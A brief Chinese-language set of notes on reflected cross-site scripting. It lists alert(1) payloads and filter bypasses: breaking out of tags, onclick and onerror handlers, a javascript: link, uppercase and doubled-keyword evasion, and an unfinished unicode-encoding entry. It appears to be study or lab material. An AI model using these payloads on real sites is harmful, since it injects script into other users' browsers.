# XSS

## 反射型

<script>alert(1)</script>

闭合标签

111”><script>alert(1)</script><

使用onclick,这里使用了单引号闭合。过滤了双引号，但未过滤单引号

111' onclick='alert(1)'"

使用onerror

<img src='1' onerror='alert(1)'>



伪协议

111”><a href="javascript:alert(1)"><

大写绕过

111”><SCRIPT>alert(1)</SCRIPT><

双写绕过

111"><scriscriptpt>alert(1)</scriscriptpt><"

将代码进行unicode编码绕过

 

